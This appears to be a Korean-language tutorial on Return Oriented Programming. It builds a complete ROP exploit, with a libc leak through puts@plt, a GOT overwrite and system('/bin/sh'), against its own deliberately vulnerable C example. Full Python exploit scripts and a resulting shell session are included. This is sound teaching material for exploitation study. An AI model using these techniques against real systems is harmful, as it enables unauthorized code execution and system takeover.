# ROP
* **Return Oriented Programming(ROP)** : 코드 영역에 있는 다양한 코드 가젯들을 조합해 NX bit와 ASLR 보호 기법을 우회할 수 있는 공격 기법
* 예제1
```
; example5
0x8048380:
  pop eax
  ret
0x8048480:
  xchg ebp, ecx
  ret
  
0x8048580:
  mov ecx, eax
  ret
```

바이너리 코드 영역에 example5와 같은 코드 가젯들이 존재하고 있다.
스택 오퍼플로우 취약점을 통해 리턴 주소 및 그 뒤에 메모리를 원하는 값으로 덮어쓸 수 있다고 가정하였을 때, example5 코드 가젯들로 ebp 레지스터의 값을 0xdeadbeef로 바꾸어 보자.
example5에 있는 코드 가젯들은 모두 ret명령어로 끝난다.
이는 하나의 코드 가젯을 실행이 끝난 후 다음 코드 가젯으로 리턴하여 여러 가젯들을 체이닝하여 실행하는 것을 가능하게 해준다.
리턴 주소를 시작으로 스택이 다음과 같이 구성되어 있다고 가정해보자.      
![image](https://user-images.githubusercontent.com/59531805/79449983-2c12ea00-801f-11ea-9aa4-514f9547b00d.png)   
현재 esp 레지스터가 가리키고 있는 메모리는 진한 색으로 표시되어 있다.
스택 오버플로우 취약점이 존재하는 함수가 리턴할 때, 리턴 주소가 0x8048380으로 바뀌어 있기 때문에 0x8048380으로 점프한다.
이 떄의 스택과 esp 레지스터의 상태는 다음과 같다.   
![image](https://user-images.githubusercontent.com/59531805/79450076-5664a780-801f-11ea-91c7-9d56451d2696.png)   
0x8048380에서 pop eax를 실행하면 eax 레지스터에 현재 esp 레지스터가 가리키고 있는 0x41414141이 들어가게 되고, 스택과 esp 레지스터는 다음과 같은 상태가 된다.    
![image](https://user-images.githubusercontent.com/59531805/79450135-74caa300-801f-11ea-863d-e5899f55561c.png)   
0x8048380에 위치한 코드 가젯인 pop eax를 실행한 후 ret을 실행하기 때문에 실행 흐름은 현재 esp 레지스터가 가리키고 있는 0x8048580으로 분기한다.
0x8048580 코드 가젯은 mov ecx, eax이기 때문에 ecx에 0x41414141이 들어가게 된다.

이렇듯, ret 명령어르 코드 가젯들을 사용하면 여러 가젯을 연결하여 하나의 가젯으로 할 수 없는 행위를 할 수 있게 된다.
그렇다면 ebp 레지스터의 값을 0xdeadbeef로 바꾸기 위해 구성된 스택을 살펴보도록 하자.    
![image](https://user-images.githubusercontent.com/59531805/79450409-d7bc3a00-801f-11ea-8b73-abe885816880.png)   
이와 같이 스택이 구성되면 아래와 같이 pop eax(0xdeadbeef) + mov ecx, eax + xchg ebp, ecs 명령들이 순차적으로 실행되어 최종적으로 ebp레지스터에 0xdeadbeef 값이 들어가게 된다.

* 예제2
```
//gcc -o example4 example4.c -fno-stack-protector -mpreferred-stack-boundary=2 -m32
#include <stdio.h>
int main(void){
  char buf[32] = {};
  puts("Hello World!");
  puts("Hello ASLR!");
  scanf("%s", buf);
  return 0;
}
```
익스플로잇의 최종 목표는 system("/bin/sh")를 실행하는 것이다.
첫 번째 단계는 system ㅎ마수의 주소와 "/bin/sh" 문자열의 주소를 찾는 것이다.
프로그램은 실행될 떄마다 라이브러리 주소가 랜덤하게 매핑된다. 그러나 한 번 매핑된 라이브러리 주소는 프로그램이 종료될 때 까지 바뀌지 않는다.
이를 이용하여 system 함수와 "/bin/sh" 문자열의 주소를 찾을 수 있다.
```
$ gdb -q ./example4
Reading symbols from ./example4...(no debugging symbols found)...done.
(gdb) x/3i 0x8048320
   0x8048320 <puts@plt>:	jmp    DWORD PTR ds:0x804a00c
   0x8048326 <puts@plt+6>:	push   0x0
   0x804832b <puts@plt+11>:	jmp    0x8048310
(gdb) x/3i 0x8048340
   0x8048340 <__isoc99_scanf@plt>:	jmp    DWORD PTR ds:0x804a014
   0x8048346 <__isoc99_scanf@plt+6>:	push   0x10
   0x804834b <__isoc99_scanf@plt+11>:	jmp    0x8048310
(gdb) 
```
메모리에 로딩된 libc.so.6 라이브러리의 주소를 구하는 방법에 대해 알아보자.
앞서 라이브러리 함수를 사용하고 나면, GOT에 해당 함수의 주소가 저장된다는 것을 배웠다.
바이너리에 존재하는 puts 함수의 PLT를 이용해 scanf의 GOT에 있는 scanf 함수의 실제 주소를 출력해보도록 하자.
먼저 puts의 PLT주소를 구한다. main 함수에서 puts@plt의 주소인 0x8048320을 구했다.
또한 scanf의 PLT에서 참조하는 주소 0x804a014가 scanf의 GOT 주소인 것을 알 수 있다.
scanf에서 "%s" 포맷 스트링을 이용해 입력을 받기 때문에 주의해야 할 것이 있다. "%s" 포맷 스트링은 공백(0x20)이나 개행(0x0A) 등 단어를 구분하는 문자를 입력하면 더이상 입력을 받지 않는다.
puts 함수의 PLT 주소는 공백 문자로 시작하기 떄문에, 해당 문자를 입력한 이후에 공격 코드를 삽입할 수가 없다.
PLT를 호출하는 과정을 생각해보면, puts@plt가 아닌 puts@plt+6으로 점프해도 puts@plt를 호출한 것과 같은 결과가 된다.
떄문에 공격 코드에서는 입력의 종료를 방지하기 위해 0x8048320이 아닌 0x8048326을 사용한다.

scanf의 GOT 주소에 저장된 값을 출력해보자.
```
$ (python -c 'print "A"*36+"\x26\x83\x04\x08"+"AAAA"+"\x14\xa0\x04\x08"';cat) | ./example4
Hello World!
Hello ASLR!
????
[1]    124132 broken pipe                       ( python -c 'print "A"*36+"\x26\x83\x04\x08"+"AAAA"+"\x14\xa0\x04\x08"'; cat;  | 
       124134 segmentation fault (core dumped)  ./example4
```

출력결과를 보면, ????와 같은 non-printable character가 출력된 것을 볼 수 있다. 이는 scanf 함수 주소에 아스키 범위를 넘어선 문자가 존재하기 떄문이다.
이렇듯 동적으로 변화하는 아스키 범위 밖의 문자를 읽기 위해서는 공격 코드를 스크립트로 작성할 필요가 있다.
파이썬을 이용해 공격 코드를 작성하면 아래와 같다. 아래의 코드는 puts 함수를 호출해 scadnf@got의 메모리를 가져오는 파이썬 스크립트이다.
``` python
#!/usr/bin/python2.7
'''
example4_leak.py
'''
import struct
import subprocess
import os
import pty
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(0x8048326)   # ret addr (puts@plt + 6)
payload += p32(0xdeadbeef)  # ret after puts
payload += p32(0x804a014)   # scanf@got
writeline(s, payload)
out = readline(out_r)     # memory leakage of scanf@got
print `out`
scanf_addr = u32(out[:4])
print "scanf @ " + hex(scanf_addr)
```
```
$ python example4_leak.py
'Hello World!\r\n'
'Hello ASLR!\r\n'
'\xc0\xe0\xe2\xf7\r\n'
scanf @ 0xf7e2e0c0
```
스크립트를 실행하면 example4로부터 scanf의 주소를 구해 출력하는 것을 볼 수 있다.
구한 scanf의 주소와 libc 베이스 주소로부터  scanf ㅎ마수 주소까지의 오프셋을 이용해 libc의 베이스 주소를 구할 수 있다.
```
libc 베이스 주소 = scanf 주소 - libc 베이스 주소로부터 scanf 주소까지의 오프셋
```
readelf를 이용해 libc.so.6 파일에서 scanf 함수의 오프셋을 구할 수 있다.
```
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep scanf
   424: 0005c0c0   258 FUNC    GLOBAL DEFAULT   13 __isoc99_scanf@@GLIBC_2.7
```
```
libc 베이스 주소 = scanf 주소 - 0x5c0c0
```
leak된 libc.so.6 라이브러리 주소를 이용해 셸을 얻어보자.
익스플로잇에서는 ROP를 통해 scanf함수를 호출해 scanf@got에는 system 함수의 주소를, scanf@got+4에는 "/bin/sh" 문자열을 입력한 후 scanf@plt를 호출하여ㅏ  최종적으로 system("/bin/sh")를 실행한다.
ROP 체인에서 함수를 호출할 때, 다음 체인을 실행하기 위해 esp 레지스터를 호출한 함수의 인자 다음으로 가리키게 해주어야 한다.
objdump를 이용해 pop; pop; ret 코드 가젯을 찾아보도록 하자.
```
$ objdump -d ./example4 | grep -A3 pop
 804830d:	5b                   	pop    %ebx
 804830e:	c3                   	ret    
Disassembly of section .plt:
--
 8048362:	5e                   	pop    %esi
 8048363:	89 e1                	mov    %esp,%ecx
 8048365:	83 e4 f0             	and    $0xfffffff0,%esp
 8048368:	50                   	push   %eax
--
 8048518:	5b                   	pop    %ebx
 8048519:	5e                   	pop    %esi
 804851a:	5f                   	pop    %edi
 804851b:	5d                   	pop    %ebp
 804851c:	c3                   	ret    
 804851d:	8d 76 00             	lea    0x0(%esi),%esi
--
 8048536:	5b                   	pop    %ebx
 8048537:	c3                   	ret    
 ```
 objdump의 결과를 보면 0x4851a 주소에 pop; pop; ret 코드 가젯이 존재하는 것을 알 수 있다.
 ```
 #!/usr/bin/python
'''
example4.py
'''
import struct
import subprocess
import os
import pty
import time
def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise
def read(fd, n):
  return os.read(fd, n)
def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise
def p32(val):
  return struct.pack("<I", val)
def u32(data):
  return struct.unpack("<I", data)[0]
out_r, out_w = pty.openpty()    # to ignore buffer
s = subprocess.Popen("./example4", stdin=subprocess.PIPE, stdout=out_w)
'''
0x804851a <__libc_csu_init+90>:  pop    %edi
0x804851b <__libc_csu_init+91>:  pop    %ebp
0x804851c <__libc_csu_init+92>:  ret    
'''
pop_pop_ret = 0x804851a
pop_ret = pop_pop_ret + 1
scanf_plt = 0x8048340
puts_plt = 0x8048320
puts_got = 0x804a00c
string_fmt = 0x8048559      # "%s"
scanf_got = 0x804a014
print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n
payload  = "A"*36           # buf padding
payload += p32(puts_plt + 6)   # ret addr (puts@plt + 6)
payload += p32(pop_ret)  # ret after puts
payload += p32(scanf_got)   # scanf@got
payload += p32(scanf_plt)
payload += p32(pop_pop_ret)
payload += p32(string_fmt)
payload += p32(scanf_got)
payload += p32(scanf_plt)
payload += p32(0xdeadbeef)
payload += p32(scanf_got+4)
print `payload`
writeline(s, payload)
libc = u32(readline(out_r)[:4]) - 0x5c0c0
system = libc + 0x3ada0
print "libc @ " + hex(libc)
print "system @ " + hex(system)
writeline(s, p32(system)+"/bin/sh\x00")
print "[+] get shell"
while True:
  cmd = raw_input("$ ")
  writeline(s, cmd)
  time.sleep(0.2)
  print read(out_r, 1024)
```
 example4.py에서는 pop; pop; ret 코드 가젯을 이용하여 esp 레지스터를 scanf 함수의 인자 2개 이후 주소로 가리키게 해주었다.      
 ![image](https://user-images.githubusercontent.com/59531805/79460062-3f2db600-802f-11ea-9467-df474222ef3d.png)   
example4.py를 실행하면 셸을 성공적으로 획득한 것을 볼 수 있다.
```
$ python example4.py
'Hello World!\r\n'
'Hello ASLR!\r\n'
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&\x83\x04\x08\x1b\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\x1a\x85\x04\x08Y\x85\x04\x08\x14\xa0\x04\x08@\x83\x04\x08\xef\xbe\xad\xde\x18\xa0\x04\x08'
libc @ 0xf7d5b000
system @ 0xf7d95da0
[+] get shell
$ echo "SHELL_TEST"
SHELL_TEST
$ ls -al /etc/passwd
-rw-r--r-- 1 root root 2434 Oct 17 22:18 /etc/passwd
```













